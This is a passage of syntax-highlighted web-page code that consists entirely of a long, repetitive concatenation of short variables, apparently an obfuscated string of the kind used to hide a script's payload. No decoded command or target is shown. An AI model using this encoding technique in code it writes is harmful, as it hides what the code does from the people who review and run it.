class="hljs-variable">$e</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$l</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$i</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$q</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$x</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$x</span><span class="hljs-variable">$e</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$e</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$x</span><span class="hljs-variable">$d</span><span class="hljs-variable">$z</span><span class="hljs-variable">$e</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$i</span><span class="hljs-variable">$e</span><span class="hljs-variable">$z</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$i</span><span class="hljs-variable">$z</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$x</span><span class="hljs-variable">$l</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$x</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$i</span><span class="hljs-variable">$l</span><span class="hljs-variable">$e</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$e</span><span class="hljs-variable">$z</span><span class="hljs-variable">$z</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$z</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$e</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$l</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$i</span><span class="hljs-variable">$z</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$e</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$i</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$x</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$e</span><span class="hljs-variable">$e</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$e</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$e</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$e</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$z</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$e</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$l</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$e</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$l</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$e</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$x</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$e</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$l</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$e</span><span class="hljs-variable">$l</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$l</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$i</span><span class="hljs-variable">$z</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$q</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$l</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$x</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$e</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$l</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$z</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$i</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$d</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$d</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$z</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$e</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$l</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$i</span><span class="hljs-variable">$z</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$q</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$x</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$e</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$l</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$e</span><span class="hljs-variable">$l</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$l</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$i</span><span class="hljs-variable">$z</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$q</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$l</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$x</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$e</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$l</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$z</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$i</span><span class="hljs-variable">$z</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$q</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$d</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$d</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$d</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$d</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$z</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$e</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$l</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$e</span><span class="hljs-variable">$e</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$l</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$e</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$i</span><span class="hljs-variable">$z</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$q</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$x</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$e</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$l</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$e</span><span class="hljs-variable">$l</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$l</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$i</span><span class="hljs-variable">$z</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$q</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$l</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$x</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$e</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$l</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$z</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$i</span><span class="hljs-variable">$z</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$q</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$d</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$d</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$d</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$d</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$z</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$e</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$l</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$e</span><span class="hljs-variable">$e</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$e</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$q</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$l</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$e</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$i</span><span class="hljs-variable">$z</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$q</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$x</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$e</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$l</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$e</span><span class="hljs-variable">$l</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$l</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$i</span><span class="hljs-variable">$z</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$q</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span 